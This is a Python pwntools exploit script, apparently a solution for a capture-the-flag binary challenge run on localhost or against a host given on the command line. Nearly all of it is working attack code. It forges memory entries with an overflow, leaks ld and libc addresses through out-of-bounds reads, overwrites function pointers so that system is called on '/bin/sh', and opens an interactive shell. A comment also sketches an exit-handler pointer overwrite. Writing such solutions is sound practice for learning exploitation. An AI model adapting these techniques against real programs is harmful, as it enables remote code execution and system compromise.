from pwn import *
from subprocess import check_output
import sys
import os

_path = "./challenge_patched"
context.binary = exe = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
addr = 'localhost'
port = 1337
cmd = f'''
    set solib-search-path {os.getcwd()}
    decompiler connect ida --host localhost --port 3662
    break *0x4013C9
    break *0x40148E
    # break *0x4013A1
    continue
'''

context.terminal = ['wt.exe', 'wsl', '-e','sudo', 'bash', '-c']

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))
def conn():
    if args.LOCAL:
        if args.GDB:
            p = gdb.debug(_path, cmd)
        else:
            p = exe.process()
    
    if args.DOCKER:
        p = remote(addr, port)
        sleep(2)
        if args.GDB:
            pid = get_pid("")
            gdb.attach(pid, exe=exe.path,
                    gdbscript=cmd+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe")
            pause()

    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)
'''
'''

def p(_data, _arch = 64, endian = 'little'):
    switcher = {
        64: p64(_data & 0xffffffffffffffff, endian),
        32: p32(_data & 0xffffffff, endian),
        16: p16(_data & 0xffff, endian),
        8:  p8(_data & 0xff, endian)
    }
    return switcher[_arch]

chall = conn()

def sl(_data):
    chall.sendline(_data)

def sla(rgx, _data):
    chall.sendlineafter(rgx, _data)

def se(_data):
    chall.send(_data)

def sa(rgx, _data):
    chall.sendafter(rgx, _data)

def check():
    chall.interactive()
    exit()

def create():
    sla(b"> ", b"1")

def read(idx):
    sla(b"> ", b"2")
    sla(b"Index: ", str(idx).encode())

def write(idx, data):
    sla(b"> ", b"3")
    sla(b"Index: ", str(idx).encode())
    sl(data)

def main():
    context.log_level = 'debug' 
    payload = flat(
        b"A"*0x28,
        p64(0x41),
        p64(2),
        p64(0x403fe8),
    )
    create()
    create()
    create()
    write(1, payload)
    read(0x403e08)  
    leak = u64(chall.recv(6).ljust(8, b"\00"))
    ld.address = leak - 0x152f0
    log.info(f"ld @ {hex(ld.address)}")
    idx = (ld.address + 0x392e0) & 0xffffffff
    payload = flat(
        b"A"*0x28,
        p64(0x41),
        p64(2),
        p64(0x403ff0),
    )
    write(1, payload)
    read(idx)
    leak = u64(chall.recv(6).ljust(8, b"\00"))
    libc.address = leak - libc.sym.puts
    log.info(f"libc @ {hex(libc.address)}")
    write(0, b"/bin/sh")
    payload = flat(
        p64(libc.sym.puts),
        p64(0x400000),
        p64(libc.sym.setbuf),
        p64(libc.sym.printf),
        p64(libc.sym.system),
    )
    write(idx, payload)
    write(0, "AAAAA")
    




 
    


    check()

if __name__ == "__main__":
    main()
